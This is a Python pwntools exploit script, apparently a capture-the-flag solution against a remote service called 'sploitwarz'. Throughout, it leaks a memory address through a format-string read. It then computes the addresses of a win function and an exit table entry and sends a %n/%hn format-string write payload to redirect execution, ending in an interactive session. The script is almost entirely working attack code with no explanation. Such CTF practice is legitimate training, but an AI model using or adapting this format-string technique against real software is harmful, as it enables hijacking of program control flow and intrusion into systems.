from pwn import *
import sys

fib = [0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765]
context.terminal = ['tmux', 'splitw', '-h']

# p = process('./sploitwarz')
p = remote("plzpwn.me", "4003")
pause()
p.recv()
p.sendline('%147$#x')
p.recv()
p.sendline('g')
p.recv()
p.sendline('0.0001')
p.recvuntil(":\n")
nonfib = 0
for i in range(5):
    p.recvuntil(" ")
    x = int(p.recvline())
    if ( x not in fib):
        nonfib = i+1
p.recv()
p.sendline(str(nonfib))
p.recvuntil("done, ")
leak = int(p.recv(10), 16)
win = leak - 3135
gotcha = win + 10888
print(hex(win))
win32 = p32(win)

start = 16 + 1
print(hex(ord(win32[3])))
print(hex(ord(win32[2])))
print(hex(ord(win32[1])))
print(hex(ord(win32[0])))
off1 = ord(win32[3])*256 + ord(win32[2]) - start
off2 = ord(win32[1])*256 + ord(win32[0]) - off1 - 19



formatStr = ("%s%s%s%s"
        "%%8$n"
        "%%1$%sx."
        "%%6$hn."
        "%%1$%sx."
        "%%8$hn." %
        (p32(gotcha+3), p32(gotcha+2), p32(gotcha+1), p32(gotcha+0),
        off1, off2))

print("exit is at " + hex(gotcha))
print("win is at " + hex(win))

p.recv()
p.sendline("\nc")
p.recv()
p.sendline(formatStr)
p.sendline("\n")
p.recv()
p.sendline("g")
p.recv()
p.sendline('0.0001')
p.recvuntil(":\n")
nonfib = 0
for i in range(5):
    p.recvuntil(" ")
    x = int(p.recvline())
    if ( x not in fib):
        nonfib = i+1
p.recv()
p.sendline(str(nonfib))
p.recvuntil("done, ")
p.recv()
p.interactive()


